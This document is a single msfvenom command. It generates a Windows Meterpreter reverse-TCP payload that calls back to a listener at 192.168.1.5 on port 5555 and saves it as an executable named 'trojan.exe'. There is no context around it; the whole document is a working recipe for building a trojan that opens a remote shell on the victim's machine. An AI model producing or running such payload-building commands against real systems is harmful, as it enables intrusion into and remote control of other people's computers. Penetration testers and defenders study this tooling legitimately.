msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=5555 -a x86 -f exe>trojan.exe
